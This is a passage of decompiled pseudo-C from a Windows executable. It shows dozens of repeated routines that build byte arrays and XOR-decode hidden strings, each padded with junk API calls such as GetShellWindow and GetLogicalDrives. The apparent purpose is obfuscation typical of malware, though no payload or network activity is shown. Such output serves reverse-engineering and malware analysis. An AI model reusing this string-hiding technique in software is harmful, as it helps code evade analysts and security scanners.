var_7h._3_1_ = 0x56;\n    var_a0h = 0x576d7242;\n    var_9ch._0_1_ = 0x56;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    var_2ch = &var_1ch - iVar5;\n    do {\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        if (iVar7 != 0xe8a6d) {\n            *(iVar6 + iVar5) = *(&var_a0h + iVar6 % var_34h) ^ (iVar6 + iVar5)[&var_1ch - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x19);\n    fcn.0040f262();\n    var_1ch = 0xf2f2d61;\n    var_18h._0_1_ = 0x2b;\n    var_18h._1_1_ = 0x5d;\n    var_18h._2_1_ = 0x24;\n    var_18h._3_1_ = 0x13;\n    var_14h._0_1_ = 2;\n    var_14h._1_1_ = 0x31;\n    var_14h._2_1_ = 0x46;\n    var_14h._3_1_ = 0x2d;\n    var_10h._0_1_ = 0x1e;\n    var_10h._1_1_ = 0x28;\n    var_10h._2_1_ = 0x36;\n    var_10h._3_1_ = 0x42;\n    var_ch._0_1_ = 0x3d;\n    var_ch._1_1_ = 0xe;\n    var_ch._2_1_ = 0x31;\n    var_ch._3_1_ = 0x2a;\n    var_8h = 0x5b;\n    var_7h._0_1_ = 0x3e;\n    var_7h._1_1_ = 0x13;\n    var_7h._2_1_ = 0xd;\n    var_7h._3_1_ = 0x3d;\n    var_3h._0_1_ = 0x55;\n    var_3h._1_1_ = 0x2d;\n    var_3h._2_1_ = 0x7a;\n    var_98h = 0x617a4832;\n    var_94h._0_1_ = 0x58;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_a0h = iVar6;\n    var_2ch = &var_1ch - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar8 != 0x1bbc24) {\n            *(iVar7 + iVar6) = *(&var_98h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x1c);\n    fcn.0040f262();\n    var_1ch = 0x9752615;\n    var_18h._0_1_ = 0x3a;\n    var_18h._1_1_ = 0x2e;\n    var_18h._2_1_ = 0x2a;\n    var_18h._3_1_ = 0x56;\n    var_14h._0_1_ = 0xd;\n    var_14h._1_1_ = 0x18;\n    var_14h._2_1_ = 0x25;\n    var_14h._3_1_ = 0x20;\n    var_10h._0_1_ = 0x57;\n    var_10h._1_1_ = 0x1d;\n    var_10h._2_1_ = 0x37;\n    var_10h._3_1_ = 0x32;\n    var_ch._0_1_ = 0x13;\n    var_ch._1_1_ = 0x4a;\n    var_ch._2_1_ = 1;\n    var_ch._3_1_ = 0x2f;\n    var_8h = 0x2f;\n    var_7h._0_1_ = 0x2f;\n    var_7h._1_1_ = 0x5d;\n    var_7h._2_1_ = 0xf;\n    var_7h._3_1_ = 0x3c;\n    var_3h._0_1_ = 0x46;\n    var_90h = 0x68384346;\n    var_8ch._0_1_ = 0x59;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_98h = iVar6;\n    var_2ch = &var_1ch - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        if (iVar8 != 0xdfcea4) {\n            *(iVar7 + iVar6) = *(&var_90h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x1a);\n    fcn.0040f262();\n    var_10h._0_1_ = 0x61;\n    var_10h._1_1_ = 0x37;\n    var_10h._2_1_ = 0x21;\n    var_10h._3_1_ = 0x2f;\n    var_ch._0_1_ = 0x35;\n    var_ch._1_1_ = 0x3a;\n    var_ch._2_1_ = 0x40;\n    var_ch._3_1_ = 0x3b;\n    var_8h = 3;\n    var_7h._0_1_ = 0x25;\n    var_7h._1_1_ = 0x3b;\n    var_7h._2_1_ = 0xf;\n    var_7h._3_1_ = 0x55;\n    var_3h._0_1_ = 0x37;\n    var_3h._1_1_ = 0x75;\n    var_28h = 0x4c755232;\n    var_24h._0_2_ = 0x6a57;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_90h = iVar6;\n    var_2ch = &var_10h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar8 != 0x562a05) {\n            *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_38h) ^ (iVar7 + iVar6)[&var_10h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xf);\n    fcn.0040f262();\n    var_14h._0_1_ = 0x24;\n    var_14h._1_1_ = 0x29;\n    var_14h._2_1_ = 0x1f;\n    var_14h._3_1_ = 0x35;\n    var_10h._0_1_ = 0;\n    var_10h._1_1_ = 2;\n    var_10h._2_1_ = 0x3e;\n    var_10h._3_1_ = 0x25;\n    var_ch._0_1_ = 0x24;\n    var_ch._1_1_ = 0x1a;\n    var_ch._2_1_ = 0x27;\n    var_ch._3_1_ = 0x3e;\n    var_8h = 0x25;\n    var_7h._0_1_ = 0x26;\n    var_7h._1_1_ = 10;\n    var_7h._2_1_ = 0x1b;\n    var_7h._3_1_ = 0x29;\n    var_3h._0_1_ = 0x2b;\n    var_3h._1_1_ = 0x35;\n    var_3h._2_1_ = 99;\n    var_88h = 0x504c4c77;\n    var_84h._0_1_ = 99;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_2ch = &var_14h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetCursor)();\n        if (iVar8 != 0x81bad5) {\n            *(iVar7 + iVar6) = *(&var_88h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_14h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x14);\n    fcn.0040f262();\n    var_1ch = 0x3224560a;\n    var_18h._0_1_ = 0x3d;\n    var_18h._1_1_ = 0x3c;\n    var_18h._2_1_ = 0x7c;\n    var_18h._3_1_ = 7;\n    var_14h._0_1_ = 0x3d;\n    var_14h._1_1_ = 0x33;\n    var_14h._2_1_ = 0x2b;\n    var_14h._3_1_ = 0x40;\n    var_10h._0_1_ = 0x18;\n    var_10h._1_1_ = 0x3a;\n    var_10h._2_1_ = 0x26;\n    var_10h._3_1_ = 9;\n    var_ch._0_1_ = 0x41;\n    var_ch._1_1_ = 0x19;\n    var_ch._2_1_ = 0x25;\n    var_ch._3_1_ = 0x3f;\n    var_8h = 0x35;\n    var_7h._0_1_ = 0x56;\n    var_7h._1_1_ = 0x17;\n    var_7h._2_1_ = 0x36;\n    var_7h._3_1_ = 0x56;\n    var_80h = 0x53703359;\n    var_7ch._0_1_ = 0x56;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_88h = iVar7;\n    var_2ch = &var_1ch - iVar7;\n    do {\n        iVar9 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar9 != 0xe7099b) {\n            *(iVar8 + iVar7) = *(&var_80h + iVar8 % var_34h) ^ (iVar8 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x19);\n    fcn.0040f262();\n    var_18h._0_1_ = 0x62;\n    var_18h._1_1_ = 0x35;\n    var_18h._2_1_ = 0x2e;\n    var_18h._3_1_ = 0x28;\n    var_14h._0_1_ = 0;\n    var_14h._1_1_ = 0x55;\n    var_14h._2_1_ = 0x14;\n    var_14h._3_1_ = 0x10;\n    var_10h._0_1_ = 0x2e;\n    var_10h._1_1_ = 0x17;\n    var_10h._2_1_ = 0x54;\n    var_10h._3_1_ = 0x22;\n    var_ch._0_1_ = 0x32;\n    var_ch._1_1_ = 0x35;\n    var_ch._2_1_ = 8;\n    var_ch._3_1_ = 0x47;\n    var_8h = 0x39;\n    var_7h._0_1_ = 0xe;\n    var_7h._1_1_ = 0x22;\n    var_7h._2_1_ = 6;\n    var_7h._3_1_ = 0x54;\n    var_3h._0_1_ = 0x50;\n    var_78h = 0x47625031;\n    var_74h._0_1_ = 0x61;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_80h = iVar7;\n    var_2ch = &var_18h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetInputState)();\n        if (iVar9 != 0x4805ab) {\n            *(iVar8 + iVar7) = *(&var_78h + iVar8 % var_34h) ^ (iVar8 + iVar7)[&var_18h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x16);\n    fcn.0040f262();\n    var_1ch = 0x81e2962;\n    var_18h._0_1_ = 0x47;\n    var_18h._1_1_ = 0x1f;\n    var_18h._2_1_ = 0x54;\n    var_18h._3_1_ = 0x21;\n    var_14h._0_1_ = 0x1d;\n    var_14h._1_1_ = 3;\n    var_14h._2_1_ = 0x5b;\n    var_14h._3_1_ = 0xd;\n    var_10h._0_1_ = 0x58;\n    var_10h._1_1_ = 0x20;\n    var_10h._2_1_ = 0x28;\n    var_10h._3_1_ = 0x21;\n    var_ch._0_1_ = 0x46;\n    var_ch._1_1_ = 2;\n    var_ch._2_1_ = 0x47;\n    var_ch._3_1_ = 0x25;\n    var_8h = 0x21;\n    var_7h._0_1_ = 0x14;\n    var_7h._1_1_ = 0x53;\n    var_7h._2_1_ = 0xe;\n    var_7h._3_1_ = 0x31;\n    var_28h = 0x714d4c31;\n    var_24h._0_2_ = 0x6b34;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_78h = iVar7;\n    var_2ch = &var_1ch - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar9 != 0xa76d8a) {\n            *(iVar8 + iVar7) = *(&var_28h + iVar8 % var_38h) ^ (iVar8 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x19);\n    fcn.0040f262();\n    var_18h._0_1_ = 0x25;\n    var_18h._1_1_ = 0x34;\n    var_18h._2_1_ = 0x21;\n    var_18h._3_1_ = 0x48;\n    var_14h._0_1_ = 0x31;\n    var_14h._1_1_ = 0x3e;\n    var_14h._2_1_ = 0x13;\n    var_14h._3_1_ = 0x3c;\n    var_10h._0_1_ = 6;\n    var_10h._1_1_ = 0x58;\n    var_10h._2_1_ = 0x2f;\n    var_10h._3_1_ = 0x2f;\n    var_ch._0_1_ = 0x26;\n    var_ch._1_1_ = 0x23;\n    var_ch._2_1_ = 0x1b;\n    var_ch._3_1_ = 0x47;\n    var_8h = 0x2b;\n    var_7h._0_1_ = 0x26;\n    var_7h._1_1_ = 0x13;\n    var_7h._2_1_ = 0x36;\n    var_7h._3_1_ = 0x17;\n    var_3h._0_1_ = 0x31;\n    var_28h = 0x31725176;\n    var_24h._0_2_ = 0x4a42;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_2ch = &var_18h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar9 != 0xf17380) {\n            *(iVar8 + iVar7) = *(&var_28h + iVar8 % var_38h) ^ (iVar8 + iVar7)[&var_18h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x16);\n    fcn.0040f262();\n    var_20h = 0x27630718;\n    var_1ch = 0x5f0b2d0e;\n    var_18h._0_1_ = 0x30;\n    var_18h._1_1_ = 0x32;\n    var_18h._2_1_ = 0x22;\n    var_18h._3_1_ = 0xc;\n    var_14h._0_1_ = 0x54;\n    var_14h._1_1_ = 0x39;\n    var_14h._2_1_ = 4;\n    var_14h._3_1_ = 0x1b;\n    var_10h._0_1_ = 0x10;\n    var_10h._1_1_ = 0x5c;\n    var_10h._2_1_ = 0x36;\n    var_10h._3_1_ = 4;\n    var_ch._0_1_ = 0x38;\n    var_ch._1_1_ = 0x11;\n    var_ch._2_1_ = 99;\n    var_ch._3_1_ = 0x27;\n    var_8h = 8;\n    var_7h._0_1_ = 0x3d;\n    var_7h._1_1_ = 0xb;\n    var_7h._2_1_ = 0x5f;\n    var_7h._3_1_ = 0x30;\n    var_3h._0_1_ = 6;\n    var_3h._1_1_ = 0x2e;\n    var_3h._2_1_ = 0x62;\n    var_70h = 0x5533624b;\n    var_6ch._0_1_ = 0x61;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar9 = 0;\n    var_2ch = &var_20h - iVar8;\n    do {\n        iVar10 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar10 != 0xb56457) {\n            *(iVar9 + iVar8) = *(&var_70h + iVar9 % var_34h) ^ (iVar9 + iVar8)[&var_20h - iVar8];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x20);\n    fcn.0040f262();\n    var_20h = 0x210536a;\n    var_1ch = 0x38534b32;\n    var_18h._0_1_ = 0x1f;\n    var_18h._1_1_ = 0x34;\n    var_18h._2_1_ = 0x7b;\n    var_18h._3_1_ = 0x57;\n    var_14h._0_1_ = 0x2a;\n    var_14h._1_1_ = 9;\n    var_14h._2_1_ = 1;\n    var_14h._3_1_ = 0x4b;\n    var_10h._0_1_ = 0x5f;\n    var_10h._1_1_ = 0x36;\n    var_10h._2_1_ = 0x1e;\n    var_10h._3_1_ = 0x38;\n    var_ch._0_1_ = 0x4d;\n    var_ch._1_1_ = 0x4f;\n    var_ch._2_1_ = 9;\n    var_ch._3_1_ = 0x1e;\n    var_8h = 0x38;\n    var_7h._0_1_ = 0x4f;\n    var_7h._1_1_ = 0x5f;\n    var_7h._2_1_ = 0x35;\n    var_7h._3_1_ = 9;\n    var_3h._0_1_ = 0x36;\n    var_3h._1_1_ = 0x5c;\n    var_3h._2_1_ = 0x36;\n    var_68h = 0x6c593639;\n    var_64h._0_1_ = 0x51;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar10 = 0;\n    var_70h = iVar9;\n    var_2ch = &var_20h - iVar9;\n    do {\n        iVar11 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        if (iVar11 != 0x3744ae) {\n            *(iVar10 + iVar9) = *(&var_68h + iVar10 % var_34h) ^ (iVar10 + iVar9)[&var_20h - iVar9];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0x20);\n    fcn.0040f262();\n    var_1ch = 0x47720c19;\n    var_18h._0_1_ = 0x57;\n    var_18h._1_1_ = 5;\n    var_18h._2_1_ = 0x3e;\n    var_18h._3_1_ = 0xc;\n    var_14h._0_1_ = 0x61;\n    var_14h._1_1_ = 0x54;\n    var_14h._2_1_ = 0x55;\n    var_14h._3_1_ = 1;\n    var_10h._0_1_ = 0x2c;\n    var_10h._1_1_ = 0;\n    var_10h._2_1_ = 0x5d;\n    var_10h._3_1_ = 0x50;\n    var_ch._0_1_ = 0x62;\n    var_ch._1_1_ = 0x16;\n    var_ch._2_1_ = 0x23;\n    var_ch._3_1_ = 0x1f;\n    var_8h = 0x58;\n    var_7h._0_1_ = 0x59;\n    var_7h._1_1_ = 0x57;\n    var_7h._2_1_ = 3;\n    var_7h._3_1_ = 0x2f;\n    var_3h._0_1_ = 0x69;\n    var_28h = 0x3531694a;\n    var_24h._0_2_ = 0x6432;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar10 = 0;\n    var_68h = iVar9;\n    var_2ch = &var_1ch - iVar9;\n    do {\n        iVar11 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar11 != 0x91555c) {\n            *(iVar10 + iVar9) = *(&var_28h + iVar10 % var_38h) ^ (iVar10 + iVar9)[&var_1ch - iVar9];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0x1a);\n    fcn.0040f262();\n    var_1ch = 0x160b3c67;\n    var_18h._0_1_ = 0x21;\n    var_18h._1_1_ = 0x33;\n    var_18h._2_1_ = 0x40;\n    var_18h._3_1_ = 0x3c;\n    var_14h._0_1_ = 0x18;\n    var_14h._1_1_ = 1;\n    var_14h._2_1_ = 0x36;\n    var_14h._3_1_ = 0x3f;\n    var_10h._0_1_ = 0x55;\n    var_10h._1_1_ = 0x37;\n    var_10h._2_1_ = 0x2d;\n    var_10h._3_1_ = 10;\n    var_ch._0_1_ = 0x30;\n    var_ch._1_1_ = 2;\n    var_ch._2_1_ = 0x46;\n    var_ch._3_1_ = 0x30;\n    var_8h = 0x3e;\n    var_7h._0_1_ = 0xd;\n    var_7h._1_1_ = 0x28;\n    var_7h._2_1_ = 0x37;\n    var_7h._3_1_ = 0x53;\n    var_3h._0_1_ = 0x3c;\n    var_3h._1_1_ = 0x48;\n    var_28h = 0x64485934;\n    var_24h._0_2_ = 0x5244;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1c);\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar10 = 0;\n    var_2ch = &var_1ch - iVar9;\n    do {\n        iVar11 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        if (iVar11 != 0x5a4fc8) {\n            *(iVar10 + iVar9) = *(&var_28h + iVar10 % var_38h) ^ (iVar10 + iVar9)[&var_1ch - iVar9];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0x1b);\n    fcn.0040f262();\n    var_14h._0_1_ = 9;\n    var_14h._1_1_ = 10;\n    var_14h._2_1_ = 0x16;\n    var_14h._3_1_ = 0x34;\n    var_10h._0_1_ = 0x33;\n    var_10h._1_1_ = 0x5f;\n    var_10h._2_1_ = 0x2f;\n    var_10h._3_1_ = 0x1f;\n    var_ch._0_1_ = 4;\n    var_ch._1_1_ = 0x27;\n    var_ch._2_1_ = 0x39;\n    var_ch._3_1_ = 0x42;\n    var_8h = 0x33;\n    var_7h._0_1_ = 3;\n    var_7h._1_1_ = 0x31;\n    var_7h._2_1_ = 0x32;\n    var_7h._3_1_ = 0x35;\n    var_3h._0_1_ = 0x34;\n    var_28h = 0x55546f5a;\n    var_24h._0_2_ = 0x3450;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar11 = 0;\n    var_2ch = &var_14h - iVar10;\n    do {\n        iVar12 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar12 != 0x111249) {\n            *(iVar11 + iVar10) = *(&var_28h + iVar11 % var_38h) ^ (iVar11 + iVar10)[&var_14h - iVar10];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x12);\n    fcn.0040f262();\n    var_14h._0_1_ = 0x36;\n    var_14h._1_1_ = 1;\n    var_14h._2_1_ = 7;\n    var_14h._3_1_ = 0x37;\n    var_10h._0_1_ = 0x15;\n    var_10h._1_1_ = 0x11;\n    var_10h._2_1_ = 0xb;\n    var_10h._3_1_ = 0x27;\n    var_ch._0_1_ = 0x37;\n    var_ch._1_1_ = 0x36;\n    var_ch._2_1_ = 0x17;\n    var_ch._3_1_ = 0xd;\n    var_8h = 0x23;\n    var_7h._0_1_ = 0x3b;\n    var_7h._1_1_ = 10;\n    var_7h._2_1_ = 0;\n    var_7h._3_1_ = 3;\n    var_3h._0_1_ = 0x30;\n    var_3h._1_1_ = 0x52;\n    var_b0h = 0x52556465;\n    var_ach._0_1_ = 0x66;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar12 = 0;\n    var_2ch = &var_14h - iVar11;\n    do {\n        iVar13 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar13 != 0xcda95c) {\n            *(iVar12 + iVar11) = *(&var_b0h + iVar12 % var_34h) ^ (iVar12 + iVar11)[&var_14h - iVar11];\n        }\n        iVar12 = iVar12 + 1;\n    } while (iVar12 < 0x13);\n    fcn.0040f262();\n    var_14h._0_1_ = 0x2b;\n    var_14h._1_1_ = 0x17;\n    var_14h._2_1_ = 100;\n    var_14h._3_1_ = 10;\n    var_10h._0_1_ = 0x36;\n    var_10h._1_1_ = 0xc;\n    var_10h._2_1_ = 0x16;\n    var_10h._3_1_ = 0x58;\n    var_ch._0_1_ = 0x15;\n    var_ch._1_1_ = 0x2d;\n    var_ch._2_1_ = 0x28;\n    var_ch._3_1_ = 0;\n    var_8h = 0x5e;\n    var_7h._0_1_ = 0x14;\n    var_7h._1_1_ = 0x2a;\n    var_7h._2_1_ = 0x14;\n    var_7h._3_1_ = 0x17;\n    var_3h._0_1_ = 0x50;\n    var_3h._1_1_ = 7;\n    var_3h._2_1_ = 0x43;\n    var_48h = 0x62377278;\n    var_44h._0_1_ = 0x43;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar13 = 0;\n    var_b0h = iVar12;\n    var_2ch = &var_14h - iVar12;\n    do {\n        iVar14 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        if (iVar14 != 0xbaaa) {\n            *(iVar13 + iVar12) = *(&var_48h + iVar13 % var_34h) ^ (iVar13 + iVar12)[&var_14h - iVar12];\n        }\n        iVar13 = iVar13 + 1;\n    } while (iVar13 < 0x14);\n    fcn.0040f262();\n    var_14h._0_1_ = 0x61;\n    var_14h._1_1_ = 6;\n    var_14h._2_1_ = 0x7d;\n    var_14h._3_1_ = 0x10;\n    var_10h._0_1_ = 0xe;\n    var_10h._1_1_ = 0x40;\n    var_10h._2_1_ = 0x55;\n    var_10h._3_1_ = 0x33;\n    var_ch._0_1_ = 0x4b;\n    var_ch._1_1_ = 0x1c;\n    var_ch._2_1_ = 0x1a;\n    var_ch._3_1_ = 0x5c;\n    var_8h = 0x5e;\n    var_7h._1_1_ = 0x5e;\n    var_7h._2_1_ = 0x10;\n    var_7h._3_1_ = 0x6c;\n    var_28h = 0x75396332;\n    var_24h._0_2_ = 0x356c;\n    var_7h._0_1_ = var_14h._1_1_;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar13 = 0;\n    var_48h = iVar12;\n    var_2ch = &var_14h - iVar12;\n    do {\n        iVar14 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        if (iVar14 != 0xa2d81c) {\n            *(iVar13 + iVar12) = *(&var_28h + iVar13 % var_38h) ^ (iVar13 + iVar12)[&var_14h - iVar12];\n        }\n        iVar13 = iVar13 + 1;\n    } while (iVar13 < 0x11);\n    fcn.0040f262();\n    var_14h._0_1_ = 9;\n    var_14h._1_1_ = 1;\n    var_14h._2_1_ = 0x20;\n    var_14h._3_1_ = 0x17;\n    var_10h._0_1_ = 0x29;\n    var_10h._1_1_ = 0x33;\n    var_10h._2_1_ = 0x10;\n    var_10h._3_1_ = 0x31;\n    var_ch._0_1_ = 0x10;\n    var_ch._1_1_ = 0x24;\n    var_ch._2_1_ = 0x2c;\n    var_ch._3_1_ = 0xd;\n    var_8h = 0xd;\n    var_7h._0_1_ = 7;\n    var_7h._1_1_ = 0x2a;\n    var_7h._2_1_ = 0x3f;\n    var_7h._3_1_ = 100;\n    var_40h = 0x6261645a;\n    var_3ch._0_1_ = 0x4d;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar13 = 0;\n    var_2ch = &var_14h - iVar12;\n    do {\n        iVar14 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        if (iVar14 != 0x53e21) {\n            *(iVar13 + iVar12) = *(&var_40h + iVar13 % var_34h) ^ (iVar13 + iVar12)[&var_14h - iVar12];\n        }\n        iVar13 = iVar13 + 1;\n    } while (iVar13 < 0x11);\n    fcn.0040f262();\n    var_20h = 0x2a320b0b;\n    var_1ch = 0xc0b2c16;\n    var_18h._0_1_ = 0x16;\n    var_18h._1_1_ = 0xb;\n    var_18h._2_1_ = 0x2e;\n    var_18h._3_1_ = 7;\n    var_14h._0_1_ = 0x13;\n    var_14h._1_1_ = 0x3c;\n    var_14h._2_1_ = 0xb;\n    var_14h._3_1_ = 0x35;\n    var_10h._0_1_ = 0xb;\n    var_10h._1_1_ = 0xf;\n    var_10h._2_1_ = 0x27;\n    var_10h._3_1_ = 0x35;\n    var_ch._0_1_ = 0x2a;\n    var_ch._1_1_ = 7;\n    var_ch._2_1_ = 0x17;\n    var_ch._3_1_ = 0x3a;\n    var_8h = 9;\n    var_7h._0_1_ = 0x3d;\n    var_7h._1_1_ = 9;\n    var_7h._2_1_ = 4;\n    var_7h._3_1_ = 0x53;\n    var_58h = 0x53616e58;\n    var_54h._0_1_ = 0x65;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1e);\n    iVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar14 = 0;\n    var_40h = iVar13;\n    var_2ch = &var_20h - iVar13;\n    do {\n        iVar15 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar15 != 0x6f81d8) {\n            *(iVar14 + iVar13) = *(&var_58h + iVar14 % var_34h) ^ (iVar14 + iVar13)[&var_20h - iVar13];\n        }\n        iVar14 = iVar14 + 1;\n    } while (iVar14 < 0x1d);\n    fcn.0040f262();\n    var_18h._0_1_ = 0xb;\n    var_18h._1_1_ = 0x53;\n    var_18h._2_1_ = 0x27;\n    var_18h._3_1_ = 0x1a;\n    var_14h._0_1_ = 0x31;\n    var_14h._1_1_ = 0x5c;\n    var_14h._2_1_ = 0x3f;\n    var_14h._3_1_ = 0x53;\n    var_10h._0_1_ = 0x2a;\n    var_10h._1_1_ = 0x1d;\n    var_10h._2_1_ = 0x24;\n    var_10h._3_1_ = 0x5b;\n    var_ch._0_1_ = 0x3e;\n    var_ch._1_1_ = 0x4f;\n    var_ch._2_1_ = 0x34;\n    var_ch._3_1_ = 0;\n    var_8h = 0x39;\n    var_7h._0_1_ = 0x44;\n    var_7h._1_1_ = 0x31;\n    var_7h._2_1_ = 0x5a;\n    var_7h._3_1_ = 1;\n    var_3h._0_1_ = 0x15;\n    var_3h._1_1_ = 0x35;\n    var_3h._2_1_ = 0x32;\n    var_28h = 0x72643658;\n    var_24h._0_2_ = 0x3250;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar14 = 0;\n    var_58h = iVar13;\n    var_2ch = &var_18h - iVar13;\n    do {\n        iVar15 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar15 != 0x6e922b) {\n            *(iVar14 + iVar13) = *(&var_28h + iVar14 % var_38h) ^ (iVar14 + iVar13)[&var_18h - iVar13];\n        }\n        iVar14 = iVar14 + 1;\n    } while (iVar14 < 0x18);\n    fcn.0040f262();\n    var_1ch = 0x241d5738;\n    var_18h._0_1_ = 0x15;\n    var_18h._1_1_ = 0x2c;\n    var_18h._2_1_ = 0x1f;\n    var_18h._3_1_ = 0x57;\n    var_14h._0_1_ = 0x1c;\n    var_14h._1_1_ = 0x29;\n    var_14h._2_1_ = 0xd;\n    var_14h._3_1_ = 0x37;\n    var_10h._0_1_ = 0xf;\n    var_10h._1_1_ = 0x5d;\n    var_10h._2_1_ = 0x38;\n    var_10h._3_1_ = 0x2f;\n    var_ch._0_1_ = 0x28;\n    var_ch._1_1_ = 0x31;\n    var_ch._2_1_ = 2;\n    var_ch._3_1_ = 0x44;\n    var_8h = 0x26;\n    var_7h._0_1_ = 0x2d;\n    var_7h._1_1_ = 0x1d;\n    var_7h._2_1_ = 0x24;\n    var_7h._3_1_ = 0xe;\n    var_3h._0_1_ = 0x32;\n    var_28h = 0x414f326b;\n    var_24h._0_2_ = 0x4378;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar14 = 0;\n    